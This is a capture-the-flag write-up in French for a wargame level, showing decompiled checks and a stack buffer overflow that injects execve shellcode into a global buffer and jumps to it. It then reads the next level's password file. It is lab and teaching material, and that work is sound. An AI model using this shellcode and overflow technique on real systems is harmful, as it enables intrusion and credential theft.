En decompilant le programe on decouvre deux fonction et une variable global user :

```c
char user[256];
verify_user_name();
verify_user_pass(const void *a1);
```

La premiere fonction (verify_user_name) check si la variable global char user contient dans ces 7 premier charactere le mot "dat_wil"

```c
int verify_user_name(){
	puts("verifying username....\n");
	return memcmp(user, "dat_wil", 7) != 0;
}
```

Si oui alors la fonction (verify_user_pass) est executer et check un pwd.

```c
int verify_user_pass(const void *a1){
	return memcmp(a1, "admin", 5) != 0;
}
```

Quoi qu'il ce passe le programe ce ferme apres ce check.


Du coup on lance gdb pour voir si on peux faire segfault le programe.

On arrive a faire segfault le programe sur le password sur l'adresse __0x37634136__

On trouve donc un offset de 80.

on cherche ensuite l'adresse de la variable __user__ dans gdb avec __info var__.
On obtient donc l'adresse __0x0804a040__.

on creer ensuite un one liner python:

> (python - c 'print "dat_wil" +  "[shellcode]" + "\n" + "A" * [offset] + "[variable address + 7]"'; cat -) | ./binary

ce qui donne: 

```bash
python -c 'print "dat_wil" + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "\n"  + "A" * 80 + "\x47\xa0\x04\x08"'; cat -) | ./level01
```

la partie avant le __\n__ sert a remplir la variable __user__ et le reste a overflow le password pour qu'il accede au shell code depuis l'adresse + 7 (pour le mot "dat_wil") de la variable __user__.

Une fois cette ligne lance il nous reste plus cas recuperer le flag comme suit:

```bash 
cat /home/users/level02/.pass
```